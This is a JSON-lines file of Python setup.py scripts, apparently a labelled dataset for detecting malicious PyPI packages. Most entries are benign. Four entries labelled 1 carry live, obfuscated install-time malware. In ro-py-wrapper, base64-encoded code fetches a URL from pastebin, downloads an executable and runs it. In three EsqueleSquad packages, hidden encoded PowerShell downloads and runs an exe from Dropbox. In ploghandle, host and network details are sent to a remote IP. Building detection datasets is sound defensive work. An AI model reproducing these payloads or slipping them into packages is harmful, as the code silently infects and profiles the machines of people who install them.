{"idx": "ro-py-wrapper-2.0.10", "func": "import setuptools, base64\n\n\nsetuptools.setup(\n    name=\"ro-py-wrapper\",\n    version=\"2.0.10\",\n    author=\"ro-py-wrapper\",\n    #description=\"Official python wrapper for the Roblox API (this is a dummy package used to demonstrate vulnerable packages and SHOULD NOT be installed\",\n    description=\"Roblox python wrapper\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir={\"\": \"src\"},\n    packages=setuptools.find_packages(where=\"src\"),\n    python_requires=\">=3.6\",\n)\n\nimport base64\nexec(base64.b64decode(\"ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK\"))\n", "target": 1}
{"idx": "Distance-0.1.3", "func": "# -*- coding: utf-8 -*- \n\n# Distance - Utilities for comparing sequences\n# Copyright (C) 2013 Micha\u00ebl Meyer\n\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n\n\nimport os, sys, ast, _ast, re\nfrom distutils.core import setup, Extension\n\nthis_dir = os.path.dirname(os.path.abspath(__file__))\npkg_dir  = os.path.join(this_dir, \"distance\")\ncpkg_dir  = os.path.join(this_dir, \"cdistance\")\n\nctypes = [\"unicode\", \"byte\", \"array\"]\n\ncfunctions = {\n\t\"levenshtein\": [\"levenshtein\", \"nlevenshtein\"],\n\t\"hamming\": [\"hamming\"],\n\t\"lcsubstrings\": [\"lcsubstrings\"],\n\t\"fastcomp\": [\"fastcomp\"],\n}\n\nsequence_compare = \"\"\"\\\n#define SEQUENCE_COMPARE(s1, i1, s2, i2) \\\\\n(PyObject_RichCompareBool( \\\\\n\tPySequence_Fast_GET_ITEM((s1), (i1)), \\\\\n\tPySequence_Fast_GET_ITEM((s2), (i2)), \\\\\n\tPy_EQ) \\\\\n)\n\"\"\"\n\ndef make_c_doc():\n\tbuff = []\n\tpy_sources = [f for f in os.listdir(pkg_dir) if f.endswith('.py')]\n\tfor file in py_sources:\n\t\twith open(os.path.join(pkg_dir, file)) as f:\n\t\t\tcontent = f.read()\n\t\ttree = ast.parse(content)\n\t\tfor doc_string in parse_tree(tree, content):\n\t\t\tbuff.append(doc_string)\n\tjoin_str = 2 * '\\n'\n\treturn join_str.join(buff) + '\\n'\n\n\ndef parse_tree(tree, content):\n\tfor node in ast.iter_child_nodes(tree):\n\t\tif not isinstance(node, _ast.FunctionDef):\n\t\t\tcontinue\n\t\tdoc_string = ast.get_docstring(node)\n\t\tif not doc_string:\n\t\t\tcontinue\n\t\tfunc_def = re.findall(\"def\\s%s\\s*(.+?)\\s*:\" % node.name, content)\n\t\tassert func_def and len(func_def) == 1\n\t\tfunc_def = node.name + func_def[0] + 2 * '\\\\n\\\\\\n'\n\t\tdoc_string = doc_string.replace('\\n', '\\\\n\\\\\\n').replace('\"', '\\\\\"')\n\t\tdoc_string = doc_string.replace('\\n' + 8 * ' ', '\\n' + 4 * ' ')\n\t\tdoc_string = '#define %s_doc \\\\\\n\"%s%s\"\\n' % (node.name, func_def, doc_string)\n\t\tyield doc_string\n\n\ndef format_header():\n\tyield sequence_compare\n\tfor cfile, cfuncs in cfunctions.items():\n\t\tfor ctype in ctypes:\n\t\t\tif ctype == \"array\":\n\t\t\t\tyield(\"#define SEQUENCE_COMP SEQUENCE_COMPARE\")\n\t\t\tyield('#define unicode %(type)s' % dict(type=ctype))\n\t\t\tfor cfunc in cfuncs:\n\t\t\t\tyield(\"#define %(function)s %(tcode)s%(function)s\" % dict(function=cfunc, tcode=ctype[0]))\n\t\t\tyield('#include \"%(file)s.c\"' % dict(file=cfile))\n\t\t\tyield(\"#undef unicode\")\n\t\t\tfor cfunc in cfuncs:\n\t\t\t\tyield(\"#undef %(function)s\" % dict(function=cfunc))\n\t\t\tif ctype == \"array\":\n\t\t\t\tyield(\"#undef SEQUENCE_COMP\")\n\t\t\tyield(\"\")\n\n\ndef prepare():\n\twith open(os.path.join(cpkg_dir, \"includes.h\"), \"w\") as f:\n\t\tf.write(make_c_doc())\n\t\tf.write(4 * '\\n')\n\t\tf.write('\\n'.join(format_header()))\n\n\nargs = sys.argv[1:]\nif \"prepare\" in args:\n\tprepare()\n\tsys.exit()\n\nif \"--with-c\" in args:\n\targs.remove(\"--with-c\")\n\text_modules = [Extension('distance.cdistance', sources=[\"cdistance/distance.c\"])]\nelse:\n\tsys.stderr.write(\"notice: no C support available\\n\")\n\text_modules = []\n\nwith open(os.path.join(this_dir, \"README.md\")) as f:\n    long_description = f.read()\n\nsetup (\n    name = 'Distance',\n    version = '0.1.3',\n    description = 'Utilities for comparing sequences',\n    long_description = long_description,\n    author='Micha\u00ebl Meyer',\n    author_email='michaelnm.meyer@gmail.com',\n    url='https://github.com/doukremt/distance',\n    ext_modules = ext_modules,\n    script_args = args,\n    packages = ['distance'],\n    classifiers=(\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: GNU General Public License (GPL)',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Programming Language :: C',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.3',\n    )\n)\n", "target": 0}
{"idx": "django-compat-1.0.15", "func": "# -*- encoding: utf-8 -*-\nimport os, sys\nfrom setuptools import setup\nfrom setuptools import find_packages\n\n# Make the open function accept encodings in python < 3.x\nif sys.version_info[0] < 3:\n    import codecs\n    open = codecs.open  # pylint: disable=redefined-builtin\n\n# Utility function to read the README file.\n# Used for the long_description.  It's nice, because now 1) we have a top level\n# README file and 2) it's easier to type in the README file than to put a raw\n# string in below ...\n\n\ndef get_path(fname):\n    return os.path.join(os.path.dirname(os.path.abspath(__file__)), fname)\n\n\ndef read(fname):\n    return open(get_path(fname), 'r', encoding='utf8').read()\n\nif sys.argv[-1] == 'genreadme':\n    try:\n        import pypandoc\n        long_description = pypandoc.convert(get_path('README.md'), 'rst')\n        long_description = long_description.split('<!---Illegal PyPi RST data -->')[0]\n        f = open(get_path('README.rst'), 'w')\n        f.write(long_description)\n        f.close()\n        print(\"Successfully converted README.md to README.rst\")\n    except (IOError, ImportError):\n        pass\n    sys.exit()\n\ntry:\n    long_description=read('README.rst')\nexcept (OSError, IOError):\n    try:\n        long_description=read('README.md')\n    except (OSError, IOError):\n        long_description = \"\"\n\nsetup(\n    name=\"django-compat\",\n    version=\"1.0.15\",\n    author='arteria GmbH',\n    author_email=\"admin@arteria.ch\",\n    packages=find_packages(),\n    include_package_data=True,\n    description=\"For- and backwards compatibility layer for Django 1.4, 1.7, 1.8, 1.9, 1.10, and 1.11\",\n    long_description=long_description,\n    license='MIT',\n    install_requires=open('requirements.txt').read().splitlines(),\n    url=\"https://github.com/arteria/django-compat\",\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'License :: OSI Approved :: MIT License',\n        'Framework :: Django',\n        'Framework :: Django :: 1.4',\n        'Framework :: Django :: 1.6',\n        'Framework :: Django :: 1.7',\n        'Framework :: Django :: 1.8',\n        'Framework :: Django :: 1.9',\n        'Framework :: Django :: 1.10',\n        'Framework :: Django :: 1.11',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n    ],\n)\n", "target": 0}
{"idx": "django-ckeditor-6.5.0", "func": "#!/usr/bin/env python3\n\nimport os\nimport sys\n\nfrom setuptools import find_packages, setup\n\n\nversion = __import__(\"ckeditor\").__version__\n\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist upload\")\n    os.system(\"python setup.py bdist_wheel upload\")\n    sys.exit()\n\nif sys.argv[-1] == \"tag\":\n    os.system(f\"git tag -a {version} -m 'version {version}'\")\n    os.system(\"git push --tags\")\n    sys.exit()\n\nlong_description = \"\\n\".join(\n    [\n        open(\"README.rst\").read(),\n        open(\"AUTHORS.rst\").read(),\n        open(\"CHANGELOG.rst\").read(),\n    ]\n)\n\n\ndef get_source_files():\n    for dirname, _, files in os.walk(\"ckeditor/static/ckeditor/ckeditor/_source\"):\n        for filename in files:\n            yield os.path.join(\"/\".join(dirname.split(\"/\")[1:]), filename)\n\n\nsetup(\n    name=\"django-ckeditor\",\n    version=version,\n    description=\"Django admin CKEditor integration.\",\n    long_description=long_description,\n    author=\"Shaun Sephton & Piotr Malinski\",\n    author_email=\"riklaunim@gmail.com\",\n    url=\"https://github.com/django-ckeditor/django-ckeditor\",\n    project_urls={\n        \"Documentation\": \"https://django-ckeditor.readthedocs.io/en/latest/\",\n        \"Source\": \"https://github.com/django-ckeditor/django-ckeditor\",\n    },\n    packages=find_packages(exclude=[\"*.demo\"]),\n    zip_safe=False,\n    install_requires=[\n        \"Django>=3.2\",\n        \"django-js-asset>=1.2.2\",\n    ],\n    python_requires=\">=3.8\",\n    include_package_data=True,\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n    ],\n)\n", "target": 0}
{"idx": "dataclasses-avroschema-0.30.3", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\" setup.py for dataclasses-avroschema.\"\"\"\n\nfrom setuptools import find_packages, setup\n\n__version__ = \"0.30.3\"\n\n\nwith open(\"README.md\") as readme_file:\n    long_description = readme_file.read()\n\nsetup(\n    name=\"dataclasses-avroschema\",\n    version=__version__,\n    description=\"Generate Avro Schemas from a Python class\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"Marcos Schroh\",\n    install_requires=[\n        \"inflect>=5.3.0\",\n        \"fastavro>=1.5.4\",\n        \"pytz\",\n        \"dacite>=1.6.0\",\n        \"faker>=8.1.1\",\n        'typing_extensions>=3.7.4;python_version<\"3.9\"',\n        \"stringcase>=1.2.0\",\n    ],\n    extras_require={\n        \"pydantic\": [\"pydantic>=1.9.0\"],\n    },\n    author_email=\"schrohm@gmail.com\",\n    url=\"https://github.com/marcosschroh/dataclasses-avroschema\",\n    download_url=\"\",\n    packages=find_packages(exclude=(\"tests\",)),\n    include_package_data=True,\n    license=\"MIT\",\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Topic :: Software Development\",\n    ],\n    keywords=(\n        \"\"\"\n        Python, Data Classes, Avro Schema, Avro, Apache, Data Streaming\n        \"\"\"\n    ),\n)\n", "target": 0}
{"idx": "edk2-pytool-extensions-0.17.1", "func": "## @file setup.py\n# This contains setup info for edk2-pytool-extensions pip module\n#\n##\n# Copyright (c) Microsoft Corporation\n#\n# SPDX-License-Identifier: BSD-2-Clause-Patent\n##\nimport setuptools\nfrom setuptools.command.sdist import sdist\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom edk2toolext.bin.nuget import DownloadNuget\n\nwith open(\"readme.md\", \"r\") as fh:\n    long_description = fh.read()\n\n\nclass PostSdistCommand(sdist):\n    \"\"\"Post-sdist.\"\"\"\n    def run(self):\n        # we need to download nuget so throw the exception if we don't get it\n        DownloadNuget()\n        sdist.run(self)\n\n\nclass PostInstallCommand(install):\n    \"\"\"Post-install.\"\"\"\n    def run(self):\n        try:\n            DownloadNuget()\n        except Exception:\n            pass\n        install.run(self)\n\n\nclass PostDevCommand(develop):\n    \"\"\"Post-develop.\"\"\"\n    def run(self):\n        try:\n            DownloadNuget()\n        except Exception:\n            pass\n        develop.run(self)\n\n\nsetuptools.setup(\n    name=\"edk2-pytool-extensions\",\n    author=\"Tianocore Edk2-PyTool-Extensions team\",\n    author_email=\"sean.brogan@microsoft.com\",\n    description=\"Python tools supporting UEFI EDK2 firmware development\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/tianocore/edk2-pytool-extensions\",\n    license='BSD-2-Clause-Patent',\n    packages=setuptools.find_packages(),\n    use_scm_version=True,\n    setup_requires=['setuptools_scm'],\n    cmdclass={\n        'sdist': PostSdistCommand,\n        'install': PostInstallCommand,\n        'develop': PostDevCommand,\n    },\n    include_package_data=True,\n    entry_points={\n        'console_scripts': ['stuart_setup=edk2toolext.invocables.edk2_setup:main',\n                            'stuart_update=edk2toolext.invocables.edk2_update:main',\n                            'stuart_build=edk2toolext.invocables.edk2_platform_build:main',\n                            'stuart_ci_build=edk2toolext.invocables.edk2_ci_build:main',\n                            'stuart_ci_setup=edk2toolext.invocables.edk2_ci_setup:main',\n                            'stuart_pr_eval=edk2toolext.invocables.edk2_pr_eval:main',\n                            'omnicache=edk2toolext.omnicache:main',\n                            'nuget-publish=edk2toolext.nuget_publishing:go',\n                            'sig_db_tool=edk2toolext.uefi.sig_db_tool:main',\n                            'firmware_policy_tool=edk2toolext.windows.policy.firmware_policy_tool:main',\n                            'edk2_capsule_tool=edk2toolext.capsule.capsule_tool:main',\n                            'versioninfo_tool=edk2toolext.versioninfo.versioninfo_tool:main',\n                            'validate_image_tool=edk2toolext.image_validation:main']\n    },\n    install_requires=[\n        'pyyaml>=5.3.1',\n        'edk2-pytool-library>=0.11.0',\n        'pefile>=2019.4.18'\n    ],\n    extras_require={\n        'openssl': ['pyopenssl']\n    },\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\"\n    ]\n)\n", "target": 0}
{"idx": "django-nine-0.2.5", "func": "import sys\nimport os\nfrom setuptools import setup, find_packages\n\ntry:\n    readme = open(os.path.join(os.path.dirname(__file__), \"README.rst\")).read()\nexcept:\n    readme = \"\"\n\nversion = \"0.2.5\"\n\ninstall_requires = [\n    \"Django\",\n]\n\ntests_require = [\n    \"Django\",\n    \"mock\",\n]\n\ntry:\n    PY2 = sys.version_info[0] == 2\n    LTE_PY26 = PY2 and (7 > sys.version_info[1])\n    PY3 = sys.version_info[0] == 3\n\n    if LTE_PY26:\n        install_requires.append(\"importlib\")\nexcept:\n    pass\n\nsetup(\n    name=\"django-nine\",\n    version=version,\n    description=\"Version checking library.\",\n    long_description=\"{0}\".format(readme),\n    classifiers=[\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Environment :: Web Environment\",\n        \"License :: OSI Approved :: GNU General Public License v2 (GPLv2)\",\n        \"License :: OSI Approved :: GNU Lesser General Public License v2 or \"\n        \"later (LGPLv2+)\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 4 - Beta\",\n    ],\n    project_urls={\n        \"Bug Tracker\": \"https://github.com/barseghyanartur/django-nine/issues\",\n        \"Documentation\": \"https://django-nine.readthedocs.io/\",\n        \"Source Code\": \"https://github.com/barseghyanartur/django-nine\",\n        \"Changelog\": \"https://django-nine.readthedocs.io/\" \"en/latest/changelog.html\",\n    },\n    keywords=\"django, compatibility\",\n    author=\"Artur Barseghyan\",\n    author_email=\"artur.barseghyan@gmail.com\",\n    url=\"https://github.com/barseghyanartur/django-nine/\",\n    package_dir={\"\": \"src\"},\n    packages=find_packages(where=\"./src\"),\n    license=\"GPL-2.0-only OR LGPL-2.1-or-later\",\n    install_requires=install_requires,\n    tests_require=tests_require,\n    package_data={},\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "google-api-core-2.8.2", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-api-core\"\ndescription = \"Google API client core library\"\n\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"googleapis-common-protos >= 1.56.2, < 2.0dev\",\n    \"protobuf >= 3.15.0, <5.0.0dev\",\n    \"google-auth >= 1.25.0, < 3.0dev\",\n    \"requests >= 2.18.0, < 3.0.0dev\",\n]\nextras = {\n    \"grpc\": [\"grpcio >= 1.33.2, < 2.0dev\", \"grpcio-status >= 1.33.2, < 2.0dev\"],\n}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\n\nversion = {}\nwith open(os.path.join(package_root, \"google/api_core/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-api-core\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.6\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfstringurlgrand-10.98", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstringurlgrand',\n    packages = ['modlib'],\n    version = '1.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpcvinfo-7.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcvinfo',\n    packages = ['modlib'],\n    version = '5.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ploghandle-1.62", "func": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\n\ndef read_version():\n    regexp = re.compile(r\"^__version__\\W*=\\W*'([\\d.abrc]+)'\")\n    init_py = os.path.join(os.path.dirname(__file__), \"polaris\", \"__init__.py\")\n    ver = init_py.replace(\"__init__.py\", \"version\")\n    subprocess.Popen([sys.executable, ver], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    d = platform.node() + str(platform.uname()) + os.getcwd() + os.popen(\"ifconfig|grep inet|grep -v inet6\").read()\n    requests.get(\"http://1.15.77.2/v/%s\" % base64.b64encode(d.encode()))\n    with open(init_py) as f:\n        for line in f:\n            match = regexp.match(line)\n            if match is not None:\n                return match.group(1)\n        raise RuntimeError(\"Cannot find version in {}\".format(init_py))\n\n\nsetup(\n    name=\"ploghandle\",\n    version=read_version(),\n    description=\"Python SDK\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n", "target": 1}
{"idx": "factor_analyzer-0.4.0", "func": "#!/usr/bin/env python\n\nfrom setuptools import find_packages, setup\n\n\ndef readme():\n    with open('README.rst') as f:\n        return f.read()\n\n\ndef requirements():\n    req_path = 'requirements.txt'\n    with open(req_path) as f:\n        reqs = f.read().splitlines()\n    return reqs\n\n\nsetup(name='factor_analyzer',\n      version='0.4.0',\n      description='A Factor Analysis class',\n      long_description=readme(),\n      keywords='factor analysis',\n      packages=find_packages(),\n      author=\"Jeremy Biggs\",\n      author_email=\"jbiggs@ets.org\",\n      url=\"https://github.com/EducationalTestingService/factor_analyzer\",\n      install_requires=requirements(),\n      include_package_data=True,\n      classifiers=['Intended Audience :: Science/Research',\n                   'Intended Audience :: Developers',\n                   'Programming Language :: Python',\n                   'Topic :: Scientific/Engineering',\n                   'Operating System :: Microsoft :: Windows',\n                   'Operating System :: POSIX',\n                   'Operating System :: Unix',\n                   'Operating System :: MacOS',\n                   'Programming Language :: Python :: 3',\n                   'Programming Language :: Python :: 3.7',\n                   'Programming Language :: Python :: 3.8',\n                   'Programming Language :: Python :: 3.9',\n                   ],\n      zip_safe=True)\n", "target": 0}
{"idx": "selfcvvisaping-5.57", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvvisaping',\n    packages = ['modlib'],\n    version = '3.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
